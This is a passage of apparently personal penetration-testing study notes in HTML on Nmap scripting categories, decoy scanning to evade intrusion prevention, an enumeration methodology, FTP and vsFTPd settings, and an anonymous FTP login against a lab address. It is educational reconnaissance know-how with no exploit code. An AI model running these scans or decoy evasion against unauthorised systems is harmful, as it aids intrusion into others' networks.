    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td&gt;Scripting Engine NSE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;nmap-scripting-engine&quot;&gt;Nmap Scripting Engine&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;Nmap Scripting Engine (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NSE&lt;/code&gt;) is another handy feature of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt;. It provides us with the possibility to create scripts in Lua for interaction with certain services. There are a total of 14 categories into which these scripts can be divided:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Determination of authentication credentials.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broadcast&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brute&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Executes scripts that try to log in to the respective service by brute-forcing with credentials.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Default scripts executed by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sC&lt;/code&gt; option.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discovery&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Evaluation of accessible services.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dos&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;This category of scripts tries to exploit known vulnerabilities for the scanned port.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;external&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Scripts that use external services for further processing.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fuzzer&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intrusive&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Intrusive scripts that could negatively affect the target system.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malware&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Checks if some malware infects the target system.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;safe&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Defensive scripts that do not perform intrusive and destructive access.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Extension for service detection.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Identification of specific vulnerabilities.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;We have several ways to define the desired scripts in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;use always &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sC&lt;/code&gt;&lt;/strong&gt;  for scriptiin&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.2.28&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Scans the specified target.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p 21,22,25&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Scans only the specified ports.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Performs SYN scan on specified ports.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sA&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Performs ACK scan on specified ports.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Disables ICMP Echo requests.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Disables DNS resolution.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--disable-arp-ping&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Disables ARP ping.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--packet-trace&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Shows all packets sent and received.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-D:&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;decoys&quot;&gt;Decoys&lt;/h3&gt;

&lt;p&gt;There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-D&lt;/code&gt;) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RND&lt;/code&gt;) a specific number (for example: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5&lt;/code&gt;) of IP addresses separated by a colon (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap 10.129.2.80 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 10001 &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; RND:5 &lt;span class=&quot;nt&quot;&gt;--disable-arp-ping&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; tun0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeration Methodology&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Complex processes must have a standardized methodology that helps us keep our bearings and avoid omitting any aspects by mistake. Especially with the variety of cases that the target systems can offer us, it is almost unpredictable how our approach should be designed. Therefore, most penetration testers follow their habits and the steps they feel most comfortable and familiar with. However, this is not a standardized methodology but rather an experience-based approach.&lt;/p&gt;

&lt;p&gt;We know that penetration testing, and therefore enumeration, is a dynamic process. Consequently, we have developed a static enumeration methodology for external and internal penetration tests that includes free dynamics and allows for a wide range of changes and adaptations to the given environment. This methodology is nested in 6 layers and represents, metaphorically speaking, boundaries that we try to pass with the enumeration process. The whole enumeration process is divided into three different levels:&lt;/p&gt;

&lt;p&gt;|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Infrastructure-based enumeration&lt;/code&gt;|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host-based enumeration&lt;/code&gt;|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OS-based enumeration&lt;/code&gt;|
|—|—|—|&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/112/enum-method3.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;These layers are designed as follows:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Layer&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Information Categories&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1. Internet Presence&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Identification of internet presence and externally accessible infrastructure.&lt;/td&gt;
      &lt;td&gt;Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2. Gateway&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Identify the possible security measures to protect the company’s external and internal infrastructure.&lt;/td&gt;
      &lt;td&gt;Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3. Accessible Services&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Identify accessible interfaces and services that are hosted externally or internally.&lt;/td&gt;
      &lt;td&gt;Service Type, Functionality, Configuration, Port, Version, Interface&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4. Processes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Identify the internal processes, sources, and destinations associated with the services.&lt;/td&gt;
      &lt;td&gt;PID, Processed Data, Tasks, Source, Destination&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5. Privileges&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Identification of the internal permissions and privileges to the accessible services.&lt;/td&gt;
      &lt;td&gt;Groups, Users, Permissions, Restrictions, Environment&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6. OS Setup&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Identification of the internal components and systems setup.&lt;/td&gt;
      &lt;td&gt;OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Important note: The human aspect and the information that can be obtained by employees using OSINT have been removed from the “Internet Presence” layer for simplicity.&lt;/p&gt;

&lt;p&gt;We can finally imagine the entire penetration test in the form of a labyrinth where we have to identify the gaps and find the way to get us inside as quickly and effectively as possible. This type of labyrinth may look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/112/pentest-labyrinth.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The squares represent the gaps/vulnerabilities.&lt;/p&gt;

&lt;p&gt;As we have probably already noticed, we can see that we will encounter one gap and very likely several. The interesting and very common fact is that not all the gaps we find can lead us inside. All penetration tests are limited in time, but we should always keep in mind that one belief that there is nearly always a way in. Even after a four-week penetration test, we cannot say 100% that there are no more vulnerabilities. Someone who has been studying the company for months and analyzing them will most likely have a much greater understanding of the applications and structure than we were able to gain within the few weeks we spent on the assessment. An excellent and recent example of this is the &lt;a href=&quot;https://www.rpc.senate.gov/policy-papers/the-solarwinds-cyberattack&quot;&gt;cyber attack on SolarWinds&lt;/a&gt;, which happened not too long ago. This is another excellent reason for a methodology that must exclude such cases.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;ftp&quot;&gt;FTP&lt;/h1&gt;

&lt;p&gt;#ftp&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File Transfer Protocol&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POP&lt;/code&gt;. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.&lt;/p&gt;

&lt;p&gt;Let us imagine that we want to upload local files to a server and download other files using the &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc959&quot;&gt;FTP&lt;/a&gt; protocol. In an FTP connection, two channels are opened. First, the client and server establish a control channel through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP port 21&lt;/code&gt;. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP port 20&lt;/code&gt;. This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact.&lt;/p&gt;

&lt;p&gt;A distinction is made between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;active&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passive&lt;/code&gt; FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passive mode&lt;/code&gt; has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.&lt;/p&gt;

&lt;h3 id=&quot;tftp&quot;&gt;TFTP&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Trivial File Transfer Protocol&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TFTP&lt;/code&gt;) is simpler than FTP and performs file transfers between client and server processes. However, it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;does not&lt;/code&gt; provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt;, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.&lt;/p&gt;

&lt;p&gt;Let us take a look at a few commands of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TFTP&lt;/code&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Commands&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;connect&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Sets the remote host, and optionally the port, for file transfers.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Transfers a file or set of files from the remote host to the local host.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;put&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Transfers a file or set of files from the local host onto the remote host.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;quit&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Exits tftp.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;status&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verbose&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Turns verbose mode, which displays additional information during file transfer, on or off.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Unlike the FTP client, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TFTP&lt;/code&gt; does not have directory listing functionality.&lt;/p&gt;

&lt;h4 id=&quot;vsftpd-config-file&quot;&gt;vsFTPd Config File&lt;/h4&gt;

&lt;p&gt;Configuration file is on&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/vsftpd.conf | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;#&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Setting&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;listen=NO&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Run from inetd or as a standalone daemon?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;listen_ipv6=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Listen on IPv6 ?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous_enable=NO&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Enable Anonymous access?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_enable=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allow local users to login?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirmessage_enable=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Display active directory messages when users go into certain directories?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use_localtime=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Use local time?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xferlog_enable=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Activate logging of uploads/downloads?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;connect_from_port_20=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Connect from port 20?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure_chroot_dir=/var/run/vsftpd/empty&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Name of an empty directory&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pam_service_name=vsftpd&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;This string is the name of the PAM service vsftpd will use.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The last three options specify the location of the RSA certificate to use for SSL encrypted connections.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssl_enable=NO&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;UNSAFE OPTIONS ARE:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Setting&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous_enable=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allowing anonymous login?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anon_upload_enable=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allowing anonymous to upload files?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anon_mkdir_write_enable=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allowing anonymous to create new directories?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no_anon_password=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Do not ask anonymous for password?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anon_root=/home/username/ftp&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Directory for anonymous.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write_enable=YES&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;As soon as we connect to the vsFTPd server, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response code 220&lt;/code&gt; is displayed with the banner of the FTP server. Often this banner contains the description of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service&lt;/code&gt; and even the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version&lt;/code&gt; of it. It also tells us what type of system the FTP server is. One of the most common configurations of FTP servers is to allow &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; access, which does not require legitimate credentials but provides access to some files. Even if we cannot download them, sometimes just listing the contents is enough to generate further ideas and note down information that will help us in another approach.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 10.129.14.136

Connected to 10.129.14.136.
220 &lt;span class=&quot;s2&quot;&gt;&quot;Welcome to the vsFTP service.&quot;&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.14.136:cry0l1t3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous

230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.


ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls

&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;to find every script NSE
#nse #nmap&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; ftp&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 2&amp;gt;/dev/null | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;scripts

/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;smb&quot;&gt;SMB&lt;/h1&gt;

